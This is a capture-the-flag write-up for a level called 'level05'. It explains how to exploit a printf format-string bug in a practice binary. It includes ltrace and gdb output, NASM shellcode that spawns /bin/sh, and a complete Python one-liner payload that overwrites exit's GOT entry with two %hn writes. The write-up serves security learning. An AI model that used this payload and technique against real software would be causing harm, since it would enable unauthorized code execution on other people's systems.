# Got some more printf (level05)

This [binary](source.c) takes 100 bytes of user input through a secure `fgets`
call. Then it loops on the characters of the resulting string and basically
applies a `tolower` function to each one. When it's done, it prints the _input_
buffer directly with `printf` and exits.

As usual, we can exploit the hell out of this insecure `printf` call.

```shell
# run  the binary
./level05
# give it some input
iiii%10$p
# see the result
iiii0x69696969
```

We reach into our buffer at the 10th parameter. Now, since `exit` is called
right after the printf, what we're gonna do is overwrite its got address and
replace it with the address of the shellcode that we're going to give as input.

Using ltrace, we can get the address of the input buffer:

```shell
# launch the binary with ltrace
ltrace ./level05
__libc_start_main(0x8048444, 1, -9228, 0x8048520, 0x8048590 <unfinished ...>
# give it some input
fgets(iiii%10$p
# see the result
"iiii%10$p\n", 100, 0xf7fcfac0)                            = 0xffffdae8
printf("iiii%10$p\n", 0x64iiii0x69696969
)                                      = 15
exit(0 <unfinished ...>
+++ exited (status 0) +++
```

This traces each library calls and shows their parameters and return values.
What is a little bit annoying with ltrace is that when it detects a character
pointer or buffer it automatically shows a string and not the address, except on
the return value. Since, on success, `fgets` returns the buffer it was given in
input, the address of our buffer is: 0xffffdae8.

Here is the shellcode we are going to use:

```nasm
section .text
global _start
_start:
xor		ecx, ecx	; set ecx to 0 (argv == NULL)
xor		edx, edx	; set edx to 0 (envp == NULL)
push	ecx			; push 0 to the stack to end the command string
push	0x68732f2f	; "//sh" end of the command string
push	0x6e69622f	; "/bin" start of the command string
mov		ebx, esp	; set ebx to the start of the command string
push	0xb			; push 11 (execve int number)
pop		eax			; set eax to 11
int		0x80		; execve("/bin//sh", NULL, NULL)
```

> It is very similar to the one used in rainfall's
> [bonus 0](https://github.com/Taiwing/rainfall/tree/master/bonus0), except that
> it is shorter since argv is set to NULL (because we can).

Using the compile\_nasm.bash and generate\_shellcode.bash scripts from
rainfall's shellcode
[guide](https://github.com/Taiwing/rainfall/tree/master/shellcode) we get this
string:

`\x31\xc9\x31\xd2\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80`

This should work, although we have a little problem since some bytes in the
shellcode do match uppercase ascii letters. If we just put it in our buffer like
that these values are going to be modified and the shellcode wont work. What we
need to do is add a null byte after our format string and then our payload. This
will work because `fgets` does not stop on a null byte but either on a newline
or an EOF and it will protect our payload since `strlen` will stop on the null
byte.

Now we need `exit`'s got address for the target of our %n conversion:

```shell
(gdb) disass exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```

Lets build the payload. The first four bytes are going to be `exit`'s got
address. Then we're going to add an integer conversion and set its field width
to the address of our shellcode - 4 bytes (for the first four bytes already in
the format string). Then the %n conversion which is going to target got's
address and write into it the number of characters already printed (so the last
conversion's field width + 4).

The buffer starts at 0xffffdae8, which is 4294957800 in decimal. We should as
usual use padding to write the address of the shellcode and replace `exit`'s got
address. The problem here is that the padding we need is way to big to be passed
directly to a single conversion. The maximum I have been able to specify is:
470000000 which is a little bit more than a tenth of what we want. This is
annoying. Also writing all those zeroes is very long. I'm not even sure that
printf would not return an error before that. But we can do something smarter.

The n parameter need not be an int pointer. It can also be a short or even a
char pointer. This means that we can write our big number with two or four n
conversions, which will be way easier and faster. The address we want to write
is that of our shellcode. There is 36 bytes of payload (counting the null byte)
before the shellcode, so the address we want to write is 0xffffdb0c.

First we're going to write the lowest part of the address "0xdb0c". This is a
padding of 56076, minus 8 for the two addresses before the first padding
conversion so 56068. We take the 10th parameter for the first n conversion, so
the first address in our buffer. We use the 'h' modifier to write a short int,
so two bytes.

Then we must write the two upper bytes of our address, so "0xffff". We have
already written 56076 bytes. Since "0xffff" is 65535 in decimal, we must still
write 65535 - 56076 bytes. This is a padding of 9459 for the second conversion.
Then, the second n conversion will write these two bytes to the 11th parameter's
value, which is the second address in our buffer. This is the previous one + 2
to skip the upper bytes.

```shell
(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%056068u%10$hn" + "%09459u%11$hn" + "\x00\x31\xc9\x31\xd2\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80"'; cat) | ./level05
```
